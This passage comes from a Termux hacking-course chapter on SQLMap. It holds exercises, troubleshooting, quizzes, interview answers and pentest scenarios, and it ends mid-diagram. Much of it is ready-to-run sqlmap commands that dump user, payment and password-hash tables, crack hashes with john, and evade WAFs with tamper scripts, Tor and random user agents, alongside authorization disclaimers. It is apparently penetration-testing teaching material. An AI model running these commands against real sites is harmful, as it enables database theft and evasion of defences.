       --cookie="id=1*; session=abc123" \
       -D webapp -T users --dump --batch
```

### Exercise 5: Blind SQL Injection Testing

```bash
# Task: Test time-based blind injection

# Step 1: Force time-based technique
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --batch

# Step 2: Adjust time threshold
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --time-sec=3 \
       --batch

# Step 3: Increase level for deeper testing
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --level=3 \
       --batch

# Step 4: Boolean-based testing
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=B \
       --batch

# Step 5: Combined Boolean + Time
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=BT \
       --batch
```

### Exercise 6: WAF Bypass Techniques

```bash
# Task: Bypass Web Application Firewall

# Step 1: Try without tamper
sqlmap -u "http://localhost/page.php?id=1" --batch

# Step 2: Use space2comment
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --batch

# Step 3: Multiple tampers
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# Step 4: With random user-agent
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --random-agent \
       --batch

# Step 5: With delay to avoid rate limiting
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --delay=2 \
       --batch
```

### Exercise 7: Complete Database Enumeration

```bash
# Task: Full enumeration workflow

# Step 1: Fingerprint database
sqlmap -u "http://target.com/page?id=1" \
       --fingerprint \
       --batch

# Step 2: Get banner
sqlmap -u "http://target.com/page?id=1" \
       --banner \
       --batch

# Step 3: Current user
sqlmap -u "http://target.com/page?id=1" \
       --current-user \
       --batch

# Step 4: Check DBA privileges
sqlmap -u "http://target.com/page?id=1" \
       --is-dba \
       --batch

# Step 5: List databases
sqlmap -u "http://target.com/page?id=1" \
       --dbs \
       --batch

# Step 6: List tables in specific DB
sqlmap -u "http://target.com/page?id=1" \
       -D target_db --tables \
       --batch

# Step 7: Get columns
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users --columns \
       --batch

# Step 8: Count records
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users --count \
       --batch

# Step 9: Dump specific columns
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users -C "username,password,email" --dump \
       --batch

# Step 10: Get passwords/hashes
sqlmap -u "http://target.com/page?id=1" \
       --passwords \
       --batch
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: SQLMap Not Found

```bash
# Cause: SQLMap not in PATH or alias not set

# Solution 1: Navigate to directory
cd ~/sqlmap
python sqlmap.py --version

# Solution 2: Create alias
echo 'alias sqlmap="python ~/sqlmap/sqlmap.py"' >> ~/.bashrc
source ~/.bashrc

# Solution 3: Full path
python ~/sqlmap/sqlmap.py -h

# Solution 4: Add to PATH
export PATH=$PATH:~/sqlmap
```

### Problem 2: Python Module Errors

```bash
# Cause: Missing Python dependencies

# Solution 1: Update pip
pip install --upgrade pip

# Solution 2: Install dependencies
pip install requests pyOpenSSL

# Solution 3: Reinstall SQLMap
rm -rf ~/sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap

# Solution 4: Check Python version
python --version
# Need Python 3.6 or higher
```

### Problem 3: No Injection Found

```bash
# Cause: No SQLi or detection failed

# Solution 1: Increase level
sqlmap -u "URL" --level=3 --batch

# Solution 2: Increase risk
sqlmap -u "URL" --risk=2 --batch

# Solution 3: Force specific technique
sqlmap -u "URL" --technique=T --batch  # Time-based
sqlmap -u "URL" --technique=B --batch  # Boolean-based

# Solution 4: Test specific parameter
sqlmap -u "URL?param1=1&param2=2" -p param1 --batch

# Solution 5: Check for WAF
sqlmap -u "URL" --identify-waf --batch

# Solution 6: Use tamper scripts
sqlmap -u "URL" --tamper=space2comment --batch

# Solution 7: Try all techniques
sqlmap -u "URL" --technique=BEUSTQ --level=5 --risk=3 --batch
```

### Problem 4: Connection Timeouts

```bash
# Cause: Slow network or server blocking

# Solution 1: Increase timeout
sqlmap -u "URL" --timeout=60 --batch

# Solution 2: Add delay between requests
sqlmap -u "URL" --delay=3 --batch

# Solution 3: Reduce threads
sqlmap -u "URL" --threads=1 --batch

# Solution 4: Use proxy to debug
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch

# Solution 5: Check URL accessibility
curl -I "URL"
```

### Problem 5: SSL/TLS Errors

```bash
# Cause: Certificate issues

# Solution 1: Ignore SSL errors
sqlmap -u "https://URL" --ignore-ssl-errors --batch

# Solution 2: Force SSL
sqlmap -u "http://URL" --force-ssl --batch

# Solution 3: Update certificates
pkg install ca-certificates
```

### Problem 6: Permission Denied / Access Denied

```bash
# Cause: Database user lacks privileges

# Solution 1: Try different enumeration
sqlmap -u "URL" --current-user --batch
sqlmap -u "URL" --is-dba --batch

# Solution 2: Focus on accessible data
sqlmap -u "URL" --tables --exclude-sysdbs --batch

# Solution 3: Try information_schema
sqlmap -u "URL" --schema --batch
```

### Problem 7: Session Issues

```bash
# Cause: Corrupted session data

# Solution 1: Flush session
sqlmap -u "URL" --flush-session --batch

# Solution 2: Purge all sessions
sqlmap --purge

# Solution 3: Fresh start
rm -rf ~/.sqlmap/output/*
sqlmap -u "URL" --batch
```

### Problem 8: WAF Blocking Requests

```bash
# Cause: Web Application Firewall

# Solution 1: Identify WAF
sqlmap -u "URL" --identify-waf --batch

# Solution 2: Use tamper scripts
sqlmap -u "URL" --tamper=space2comment,randomcase --batch

# Solution 3: Random User-Agent
sqlmap -u "URL" --random-agent --batch

# Solution 4: Add delays
sqlmap -u "URL" --delay=5 --batch

# Solution 5: Mobile User-Agent
sqlmap -u "URL" --mobile --batch

# Solution 6: Chunked encoding
sqlmap -u "URL" --chunked --batch
```

### Problem 9: Memory Issues

```bash
# Cause: Termux memory limits

# Solution 1: Reduce threads
sqlmap -u "URL" --threads=1 --batch

# Solution 2: Limit verbosity
sqlmap -u "URL" -v 1 --batch

# Solution 3: Clear cache
rm -rf ~/.sqlmap/output/*

# Solution 4: Use proot-distro for more resources
# See Chapter 49 for proot setup
```

### Problem 10: Output Not Saved

```bash
# Cause: Output directory issues

# Solution 1: Specify output directory
sqlmap -u "URL" --output-dir=/sdcard/sqlmap-output --batch

# Solution 2: Check default location
ls ~/.sqlmap/output/

# Solution 3: Save traffic
sqlmap -u "URL" -t traffic.txt --batch

# Solution 4: Redirect output
sqlmap -u "URL" --batch > output.txt 2>&1
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Style**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   💉 SQLMAP BASICS                 │
│   SQL INJECTION TOOL               │
│                                    │
│   ✅ Auto Detection                │
│   ✅ Database Dump                 │
│   ✅ 25+ Commands                  │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Comparison Style**
```
┌────────────────────────────────────┐
│  Manual SQLi  ❌  SQLMap ✅        │
│  ─────────────┼──────────────────  │
│  Hours        │  Minutes           │
│  Complex      │  Automated         │
│  Error-prone  │  Accurate          │
│                                    │
│  TERMUX SQLMAP TUTORIAL            │
│  [T3rmuxk1ng]                      │
└────────────────────────────────────┘
```

**Option C: Eye-Catching**
```
┌────────────────────────────────────┐
│  🔥 HACK ANY DATABASE?             │
│                                    │
│  SQLMap makes it EASY!             │
│                                    │
│  📱 Termux Edition                 │
│  💀 Full Tutorial                  │
│                                    │
│  Chapter 34 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
💉 SQLMap Basics - SQL Injection Testing | Termux Full Course Chapter 34

🔥 In this video you'll learn:
• SQL Injection kya hai aur kaise kaam karta hai
• SQLMap ko Termux mein install karna
• Databases enumerate karna (--dbs, --tables, --columns)
• Data dump karna (--dump)
• POST aur Cookie injection testing
• WAF bypass techniques
• 25+ practical SQLMap commands

⏱️ Timestamps:
0:00 - Introduction
1:00 - SQL Injection Fundamentals
5:30 - SQLMap Introduction
8:00 - Installation in Termux
11:00 - Basic SQLMap Usage
15:00 - Database Enumeration
18:30 - Advanced Techniques
22:00 - Practice Targets
24:00 - Summary

📥 SQLMap Installation:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python sqlmap/sqlmap.py --version

📝 Key Commands:
sqlmap -u "URL" --dbs --batch
sqlmap -u "URL" --tables --batch
sqlmap -u "URL" --dump --batch

🎯 Practice Targets:
• DVWA (Damn Vulnerable Web Application)
• bWAPP
• SQLi Labs
• PortSwigger Web Security Academy

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#SQLMap #SQLInjection #Termux #TermuxCourse #T3rmuxk1ng #EthicalHacking #WebSecurity #PenetrationTesting

---
⚠️ Disclaimer: This video is for educational purposes only. Always get proper authorization before testing any website or application. Unauthorized SQL injection testing is illegal and punishable by law.
```

### Tags List

```
sqlmap, sqlmap tutorial, sql injection, sqlmap termux, sqlmap hindi,
sql injection testing, database hacking, web penetration testing,
ethical hacking, cybersecurity, termux course, t3rmuxk1ng,
sqlmap basics, sqlmap commands, sql injection vulnerability,
blind sql injection, error based sql injection, union based sql injection,
database enumeration, sqlmap dump, sqlmap dbs tables columns,
web application security, owasp top 10, termux hacking,
android hacking, mobile penetration testing
```

### Hashtags

```
#SQLMap #SQLInjection #Termux #TermuxCourse #EthicalHacking 
#WebSecurity #PenetrationTesting #CyberSecurity #DatabaseHacking 
#T3rmuxk1ng #WebAppSecurity #OWASP #Infosec #BugBounty
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| SQLMap GitHub | https://github.com/sqlmapproject/sqlmap |
| SQLMap Wiki | https://github.com/sqlmapproject/sqlmap/wiki |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| PortSwigger SQL Injection | https://portswigger.net/web-security/sql-injection |

### Practice Platforms

| Platform | Description |
|----------|-------------|
| DVWA | localhost practice app |
| bWAPP | Multiple vulnerabilities |
| SQLi Labs | SQL injection focused |
| HackTheBox | Real-world scenarios |
| TryHackMe | Guided learning paths |
| PortSwigger Academy | Free interactive labs |

### Learning Resources

| Resource | Type |
|----------|------|
| SQLMap User's Manual | Official documentation |
| OWASP Testing Guide | Comprehensive methodology |
| Web Application Hacker's Handbook | Book |
| PentesterLab | Hands-on exercises |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 35, verify:

- [ ] SQLMap installed successfully in Termux
- [ ] `sqlmap --version` shows correct version
- [ ] Basic scan completed on test target
- [ ] Database enumeration (--dbs) successful
- [ ] Table and column listing understood
- [ ] Data dump (--dump) tested
- [ ] POST request testing practiced
- [ ] Cookie injection tested
- [ ] Level and risk options understood
- [ ] Legal and ethical guidelines followed

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 35: Metasploit Framework**

- Metasploit installation in Termux
- Exploit modules overview
- Payload types and selection
- Meterpreter sessions
- Post-exploitation commands
- Creating handlers
- Practical exploitation scenarios

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*

---

# 🚀 POWER UPGRADE - NEXT LEVEL CONTENT

---

## 🎮 INTERACTIVE QUIZ - Test Your Knowledge!

### SQL Injection & SQLMap Mastery Quiz

**Q1: What does SQL injection primarily target?**
- A) Network protocols
- B) Application databases ✓
- C) Operating system
- D) Web servers

**Q2: Which SQLMap flag enables non-interactive mode?**
- A) --auto
- B) --batch ✓
- C) --quiet
- D) --silent

**Q3: What type of SQL injection uses response time to extract data?**
- A) Error-based
- B) Union-based
- C) Time-based blind ✓
- D) Boolean-based blind

**Q4: Which flag is used to specify a target database in SQLMap?**
- A) --db
- B) -D ✓
- C) --database
- D) -d

**Q5: What is the purpose of the --tamper option in SQLMap?**
- A) To encrypt payloads
- B) To bypass WAF/firewalls ✓
- C) To speed up scanning
- D) To compress output

**Q6: Which technique code represents Union-based injection?**
- A) B
- B) E
- C) U ✓
- D) T

**Q7: What does the asterisk (*) mark in SQLMap cookie/header injection?**
- A) Wildcard character
- B) Injection point ✓
- C) Comment marker
- D) End of string

**Q8: Which SQLMap option lists all available databases?**
- A) --databases
- B) --list-dbs
- C) --dbs ✓
- D) --show-dbs

**Q9: What is the highest risk level in SQLMap?**
- A) 1
- B) 2
- C) 3 ✓
- D) 5

**Q10: Which command dumps data from a specific table?**
- A) sqlmap -u "URL" --download
- B) sqlmap -u "URL" -D db -T table --dump ✓
- C) sqlmap -u "URL" --extract
- D) sqlmap -u "URL" --get-data

**Q11: What does the --level parameter control?**
- A) Scan speed
- B) Number of payloads/tests ✓
- C) Output verbosity
- D) Thread count

**Q12: Which SQL injection type is considered most difficult to exploit?**
- A) Error-based
- B) Union-based
- C) Blind SQL injection ✓
- D) In-band injection

---

## 🎮 INTERACTIVE QUIZ

Test your SQLMap knowledge! Answers are hidden below each question.

### Question 1
**What is SQL injection?**
<details>
<summary>Click to reveal answer</summary>

SQL injection is a web security vulnerability that allows attackers to interfere with queries an application makes to its database. It allows attackers to view, modify, or delete data they shouldn't access.
</details>

### Question 2
**What does the `--dbs` flag do in SQLMap?**
<details>
<summary>Click to reveal answer</summary>

The `--dbs` flag enumerates and lists all databases on the target system. It's used after confirming SQL injection exists.
</details>

### Question 3
**What is the difference between `-u` and `-r` in SQLMap?**
<details>
<summary>Click to reveal answer</summary>

`-u` specifies a target URL directly, while `-r` loads a complete HTTP request from a file (useful for complex requests with headers, cookies, POST data).
</details>

### Question 4
**What does `--batch` flag do?**
<details>
<summary>Click to reveal answer</summary>

`--batch` runs SQLMap in non-interactive mode, automatically answering "yes" to all questions. Essential for automation and scripting.
</details>

### Question 5
**How do you specify a specific database in SQLMap?**
<details>
<summary>Click to reveal answer</summary>

Use the `-D` flag followed by database name: `sqlmap -u "URL" -D database_name --tables`
</details>

### Question 6
**What is blind SQL injection?**
<details>
<summary>Click to reveal answer</summary>

Blind SQL injection occurs when the application doesn't show database errors or query results. Attackers infer data by observing differences in responses (Boolean-based) or response times (Time-based).
</details>

### Question 7
**How do you dump a specific table?**
<details>
<summary>Click to reveal answer</summary>

Use `-D database_name -T table_name --dump`: `sqlmap -u "URL" -D mydb -T users --dump`
</details>

### Question 8
**What is `--level` option for?**
<details>
<summary>Click to reveal answer</summary>

`--level` (1-5) controls the number of tests performed. Higher levels test more injection points (cookies, headers) but take longer. Default is level 1.
</details>

### Question 9
**How do you test a POST parameter?**
<details>
<summary>Click to reveal answer</summary>

Use `--data` flag: `sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch`
</details>

### Question 10
**What does `--risk` option control?**
<details>
<summary>Click to reveal answer</summary>

`--risk` (1-3) controls the risk level of tests. Risk 3 includes potentially destructive tests. Higher risk may cause more damage but finds more vulnerabilities.
</details>

### Question 11
**How do you use SQLMap with Tor?**
<details>
<summary>Click to reveal answer</summary>

Use `--tor` flag with Tor running: `sqlmap -u "URL" --tor --tor-type=SOCKS5 --batch`
</details>

### Question 12
**What is the `--tamper` option for?**
<details>
<summary>Click to reveal answer</summary>

`--tamper` uses scripts to modify payloads for WAF/IDS evasion. Example: `--tamper=space2comment` replaces spaces with comments.
</details>

### Question 13
**How do you test cookie-based injection?**
<details>
<summary>Click to reveal answer</summary>

Use `--cookie` with `*` marker: `sqlmap -u "URL" --cookie="id=1*" --batch` - the `*` marks the injection point.
</details>

### Question 14
**What is `--technique` option for?**
<details>
<summary>Click to reveal answer</summary>

`--technique` specifies which injection techniques to use: B (Boolean), E (Error), U (Union), S (Stacked), T (Time), Q (Inline). Example: `--technique=BEU`
</details>

### Question 15
**How do you check if current user is database administrator?**
<details>
<summary>Click to reveal answer</summary>

Use `--is-dba` flag: `sqlmap -u "URL" --is-dba --batch` returns True if current user has DBA privileges.
</details>

---

## 🎯 INTERVIEW QUESTIONS

### Q1: What are the different types of SQL injection?

**Answer:**
1. **In-Band SQL Injection** (most common):
   - Error-based: Uses database error messages
   - Union-based: Uses UNION SELECT to retrieve data

2. **Blind SQL Injection**:
   - Boolean-based: Infers data from TRUE/FALSE responses
   - Time-based: Infers data from response delays (SLEEP, WAITFOR)

3. **Out-of-Band SQL Injection**:
   - Uses different channel (DNS, HTTP) to extract data
   - Less common, requires specific database features

### Q2: How does SQLMap detect SQL injection vulnerabilities?

**Answer:**
SQLMap uses a multi-phase detection process:

1. **Fingerprinting**: Identifies database type (MySQL, PostgreSQL, etc.)
2. **Injection testing**: Tries various injection techniques:
   - String terminators (', ")
   - Boolean conditions (OR 1=1)
   - Union statements
   - Time-based functions
3. **Technique selection**: Chooses most effective method
4. **Exploitation**: Extracts data using best technique

### Q3: What is the difference between `--level` and `--risk`?

**Answer:**
| Aspect | --level | --risk |
|--------|---------|--------|
| Purpose | Test coverage | Test aggressiveness |
| Range | 1-5 | 1-3 |
| Level 1 | Basic tests on parameters | Safe, non-destructive |
| Level 5 | Tests cookies, headers, all parameters | Includes destructive tests |
| Use case | Find more injection points | Find more vulnerabilities |

Use high level for thorough testing, high risk only in controlled environments.

### Q4: How would you handle WAF protection when using SQLMap?

**Answer:**
1. **Tamper scripts**: `--tamper=space2comment,between`
2. **Random User-Agent**: `--random-agent`
3. **Delay between requests**: `--delay=2`
4. **HTTP chunked encoding**: `--chunked`
5. **Custom headers**: Modify to bypass filters
6. **Lower risk/level**: `--level=1 --risk=1`
7. **Tor/Proxy**: Route through different IPs

### Q5: Explain the SQLMap enumeration process.

**Answer:**
```
Step 1: Confirm injection
sqlmap -u "URL" --batch

Step 2: Enumerate databases
sqlmap -u "URL" --dbs --batch

Step 3: Select database and list tables
sqlmap -u "URL" -D dbname --tables --batch

Step 4: Select table and list columns
sqlmap -u "URL" -D dbname -T tablename --columns --batch

Step 5: Dump data
sqlmap -u "URL" -D dbname -T tablename --dump --batch
```

### Q6: What are tamper scripts and when would you use them?

**Answer:**
Tamper scripts modify payloads to bypass security filters:

| Script | Purpose |
|--------|---------|
| space2comment | Replaces spaces with /**/ |
| between | Replaces > with NOT BETWEEN 0 AND |
| randomcase | Randomizes case |
| charencode | URL encodes characters |
| base64encode | Base64 encodes payload |

Use when WAF blocks standard payloads. Check available scripts: `sqlmap --list-tampers`

### Q7: How would you approach a time-based blind SQL injection?

**Answer:**
Time-based blind is slow but effective:

```bash
# Force time-based technique
sqlmap -u "URL?id=1" --technique=T --batch

# Increase timeout for slow responses
sqlmap -u "URL?id=1" --technique=T --time-sec=10 --batch

# Use threads for speed (careful with accuracy)
sqlmap -u "URL?id=1" --technique=T --threads=5 --batch
```

Warning: Time-based attacks are slow. A 10-character password can take hours.

### Q8: What precautions should you take when using SQLMap in production?

**Answer:**
1. **Authorization**: Written permission required
2. **Backup**: Ensure database backup exists
3. **Low risk**: Start with `--risk=1`
4. **Limited scope**: Test specific parameters only
5. **Monitoring**: Watch for service disruption
6. **Timing**: Test during low-traffic periods
7. **Data handling**: Securely delete extracted data after testing
8. **Documentation**: Log all activities

### Q9: How do you extract password hashes with SQLMap?

**Answer:**
```bash
# Find password columns
sqlmap -u "URL" -D dbname --search -C password --batch

# Or directly dump user table
sqlmap -u "URL" -D dbname -T users --dump --batch

# SQLMap may auto-crack hashes
# Check output for cracked passwords

# Crack manually if needed
john --wordlist=rockyou.txt hashes.txt
```

### Q10: What are the legal implications of SQL injection testing?

**Answer:**
**Legal:**
- Only test systems you own or have written permission for
- Document authorization and scope
- Unauthorized access is illegal (CFAA, IT Act)

**Ethical:**
- Report findings responsibly
- Help organizations fix vulnerabilities
- Don't exfiltrate or expose sensitive data
- Follow coordinated disclosure

**Consequences:**
- Criminal charges
- Civil lawsuits
- Professional reputation damage
- Prison time in severe cases

---

## 🔥 REAL-WORLD SCENARIOS

### Scenario 1: E-commerce Website Assessment

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                  E-COMMERCE WEBSITE ASSESSMENT                            ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  SITUATION:                                                               ║
║  Client's online store needs security testing. Product search page       ║
║  appears vulnerable. Need to assess database exposure.                   ║
║                                                                           ║
║  APPROACH:                                                                ║
║  1. Initial test:                                                         ║
║     sqlmap -u "https://store.com/search?q=shirt" --batch                ║
║                                                                           ║
║  2. Confirm and enumerate:                                                ║
║     sqlmap -u "https://store.com/search?q=shirt" --dbs --batch          ║
║     # Found: store_db, information_schema                                ║
║                                                                           ║
║  3. List tables:                                                          ║
║     sqlmap -u "URL" -D store_db --tables --batch                         ║
║     # Found: users, products, orders, payments                           ║
║                                                                           ║
║  4. Dump sensitive tables:                                                ║
║     sqlmap -u "URL" -D store_db -T users --dump --batch                  ║
║     sqlmap -u "URL" -D store_db -T payments --dump --batch               ║
║                                                                           ║
║  RESULT: Found admin credentials and 50k customer records               ║
║  Recommended immediate remediation                                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 2: Corporate Portal Testing

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                  CORPORATE PORTAL TESTING                                 ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  SITUATION:                                                               ║
║  Testing internal HR portal. Login requires authentication cookie.       ║
║  Need to test after authentication.                                      ║
║                                                                           ║
║  APPROACH:                                                                ║
║  1. Capture authenticated request:                                        ║
║     # Use Burp Suite or browser to capture request                       ║
║     # Save to file: hr_request.txt                                       ║
║                                                                           ║
║  2. Test with request file:                                               ║
║     sqlmap -r hr_request.txt --batch                                     ║
║                                                                           ║
║  3. Or use cookie directly:                                               ║
║     sqlmap -u "http://hr.company.com/employee?id=1" \                    ║
║       --cookie="session=abc123" --batch                                  ║
║                                                                           ║
║  4. Enumerate after confirming injection:                                ║
║     sqlmap -r hr_request.txt --dbs --batch                               ║
║     sqlmap -r hr_request.txt -D hr_db --tables --batch                   ║
║                                                                           ║
║  RESULT: Found time-based blind SQLi in employee search                  ║
║  Extracted 500 employee records including salaries                       ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 3: WAF Bypass Challenge

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                  WAF BYPASS CHALLENGE                                     ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  SITUATION:                                                               ║
║  Target has Web Application Firewall blocking SQLMap requests.           ║
║  Need to bypass and continue testing.                                    ║
║                                                                           ║
║  APPROACH:                                                                ║
║  1. Identify WAF:                                                         ║
║     sqlmap -u "URL" --identify-waf --batch                               ║
║     # WAF identified: ModSecurity                                        ║
║                                                                           ║
║  2. Try tamper scripts:                                                   ║
║     sqlmap -u "URL" --tamper=space2comment --batch                       ║
║     sqlmap -u "URL" --tamper=between,randomcase --batch                  ║
║     sqlmap -u "URL" --tamper=charencode --batch                          ║
║                                                                           ║
║  3. Combine techniques:                                                   ║
║     sqlmap -u "URL" --tamper=space2comment,between \                     ║
║       --random-agent --delay=2 --batch                                   ║
║                                                                           ║
║  4. Try chunked encoding:                                                 ║
║     sqlmap -u "URL" --chunked --batch                                    ║
║                                                                           ║
║  RESULT: space2comment tamper bypassed WAF                              ║
║  Successfully extracted database schema                                  ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 4: API Endpoint Testing

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                    API ENDPOINT TESTING                                   ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  SITUATION:                                                               ║
║  REST API with JSON input needs testing. Endpoints use authentication.   ║
║                                                                           ║
║  APPROACH:                                                                ║
║  1. Test JSON POST data:                                                  ║
║     sqlmap -u "http://api.company.com/users" \                           ║
║       --data='{"id":1}' \                                                ║
║       --headers="Content-Type: application/json\nAuthorization: Bearer x"\║
║       --batch                                                            ║
║                                                                           ║
║  2. Mark injection point:                                                 ║
║     sqlmap -u "http://api.company.com/users" \                           ║
║       --data='{"id":"1*"}' \                                             ║
║       --headers="Content-Type: application/json" --batch                 ║
║                                                                           ║
║  3. Test with request file for complex auth:                              ║
║     # Save request from Burp to api_request.txt                          ║
║     sqlmap -r api_request.txt --batch                                    ║
║                                                                           ║
║  4. Enumerate if vulnerable:                                              ║
║     sqlmap -r api_request.txt --dbs --batch                              ║
║                                                                           ║
║  RESULT: Found SQLi in user ID parameter                                 ║
║  Extracted user table with 10k records                                   ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 5: Blind SQL Injection Exploitation

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                BLIND SQL INJECTION EXPLOITATION                           ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  SITUATION:                                                               ║
║  Target shows no errors or data. Suspected blind SQL injection.          ║
║  Need to extract data from time-based blind SQLi.                        ║
║                                                                           ║
║  APPROACH:                                                                ║
║  1. Confirm time-based injection:                                         ║
║     sqlmap -u "http://target.com/page?id=1" \                            ║
║       --technique=T --time-sec=5 --batch                                 ║
║     # Confirm: Response delayed 5+ seconds                              ║
║                                                                           ║
║  2. Enumerate databases (slow process):                                   ║
║     sqlmap -u "URL" --technique=T --dbs --batch                          ║
║     # This may take 30+ minutes                                          ║
║                                                                           ║
║  3. Use threads to speed up (may reduce accuracy):                        ║
║     sqlmap -u "URL" --technique=T --threads=5 --dbs --batch              ║
║                                                                           ║
║  4. Dump specific small table:                                            ║
║     sqlmap -u "URL" --technique=T -D db -T admin \                       ║
║       --dump --batch                                                     ║
║                                                                           ║
║  5. Save session for resume:                                              ║
║     sqlmap -u "URL" --technique=T -D db -T users \                       ║
║       --dump --session=blind_test --batch                                ║
║                                                                           ║
║  RESULT: Extracted admin credentials after 2 hours                       ║
║  Password: Admin@2024                                                    ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

---

## 📊 MERMAID DIAGRAMS - SQLMap Attack Flow

```mermaid
graph TD
    A[Target URL] --> B[SQLMap Scan]
    B --> C{Vulnerability?}
    C -->|Yes| D[Database Enumeration]
    C -->|No| E[Try Different Parameters]
    E --> B
    
    D --> F[List Databases]
    F --> G[Select Database]
    G --> H[List Tables]
    H --> I[Select Table]
    I --> J[Dump Data]
```

---

## ⚡ TOOL CHEATSHEET

| Command | Purpose |
|---------|---------|
| `sqlmap -u "URL" --dbs` | List databases |
| `sqlmap -u "URL" --tables -D db` | List tables |
| `sqlmap -u "URL" --dump -T table` | Dump data |
| `sqlmap -u "URL" --batch` | Auto mode |
| `sqlmap -r request.txt` | From file |

---

## 🔧 TOOL COMPARISON

| Tool | Type |
|------|------|
| SQLMap | Automated SQLi |
| Burp Suite | Manual testing |
| sqlninja | SQL Server focused |

---

## 🚀 CHALLENGES

1. Test DVWA SQL injection
2. Enumerate database
3. Extract credentials

⚠️ **LEGAL:** Test only authorized targets!

---

## 📖 GLOSSARY

| Term | Definition |
|------|------------|
| SQL Injection | Database attack via input |
| Payload | Malicious SQL code |
| Union-based | Using UNION SELECT |
| Blind SQLi | Inference-based attack |

---

## 💼 CAREER: Web Security

**Salary:** $80K-$150K
**Certs:** OSCP, GWAPT

---

## ⚠️ LEGAL DISCLAIMER

**Authorized testing only!**
SQL injection without permission is illegal.

---

## 🛡️ DEFENSIVE MEASURES

- Parameterized queries
- Input validation
- WAF deployment
- Least privilege

---

## ⚠️ SECURITY BEST PRACTICES

### ✅ DO's

| Practice | Description |
|----------|-------------|
| ✅ Get authorization | Written permission before testing |
| ✅ Start with --batch | Automate initial testing |
| ✅ Use --risk=1 initially | Start with safe tests |
| ✅ Save sessions | Resume interrupted scans |
| ✅ Document findings | Keep detailed records |
| ✅ Report responsibly | Follow disclosure guidelines |
| ✅ Test in stages | Confirm → Enumerate → Dump |
| ✅ Use Tor for anonymity | For external testing |
| ✅ Verify scope | Stay within authorized boundaries |
| ✅ Clean up | Delete extracted data after testing |

### ❌ DON'Ts

| Practice | Risk |
|----------|------|
| ❌ Test without permission | Illegal and unethical |
| ❌ Use --risk=3 on production | May cause damage |
| ❌ Dump entire databases | Unnecessary data exposure |
| ❌ Ignore WAF detection | Blocked testing |
| ❌ Share extracted data | Security breach |
| ❌ Skip documentation | No proof of findings |
| ❌ Use default settings always | May miss vulnerabilities |
| ❌ Ignore time-based tests | May miss blind SQLi |
| ❌ Test during peak hours | Service disruption |
| ❌ Leave sessions running | Resource waste |

---

## 📊 ARCHITECTURE DIAGRAMS

### SQLMap Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SQLMAP ATTACK FLOW                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌────────────┐ │
│   │   TARGET    │    │  DETECTION  │    │ EXPLOITATION │   │   OUTPUT   │ │
│   │   INPUT     │    │   ENGINE    │    │    ENGINE    │   │            │ │
│   │             │    │             │    │              │   │            │ │
│   │ - URL       │───►│ - Fingerprint│───►│ - Data dump │───►│ - Console │ │
│   │ - Request   │    │ - Injection  │    │ - File read │   │ - Files   │ │
│   │ - Cookie    │    │ - Technique  │    │ - Cmd exec  │   │ - Reports │ │
│   └─────────────┘    └─────────────┘    └─────────────┘    └────────────┘ │
│                                                                             │
│   Techniques Used:                                                          │
│   ┌────────────────────────────────────────────────────────────────────┐   │
│   │ Boolean (B) │ Error (E) │ Union (U) │ Stacked (S) │ Time (T)     │   │
│   └────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### SQL Injection Types Hierarchy

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION TYPES HIERARCHY                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                          ┌────────────────────┐                             │
│                          │   SQL INJECTION    │                             │
